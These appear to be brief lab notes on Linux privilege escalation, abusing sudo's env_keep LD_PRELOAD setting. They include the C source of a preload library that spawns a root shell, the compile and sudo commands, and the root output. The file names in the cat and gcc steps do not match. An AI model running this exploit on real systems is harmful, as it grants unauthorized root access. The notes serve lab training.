# Unix Shell

## 01 - Detect

```
TCM@debian:~$ sudo -l
Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD
..[snip]..
```

## 02 - Exploit

```
TCM@debian:~$ mkdir exploit && cd exploit
TCM@debian:~/exploit$ cat shell_preload.c
#include <stdio.h>  
#include <sys/types.h>  
#include <stdlib.h>  
  
void _init() {  
    unsetenv("LD_PRELOAD");  
    setgid(0);  
    setuid(0);  
    system("/bin/bash");  
}
TCM@debian:~/exploit$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
TCM@debian:~/exploit$ sudo LD_PRELOAD=~/exploit/shell.so apache2
root@debian:/home/user/exploit# id
uid=0(root) gid=0(root) groups=0(root)
root@debian:/home/user/exploit# exit
exit
apache2: bad user name ${APACHE_RUN_USER}
TCM@debian:~/exploit$
```

## 03 - Cleanup

```
TCM@debian:~/exploit$ cd ..
TCM@debian:~$ rm -rf exploit/
```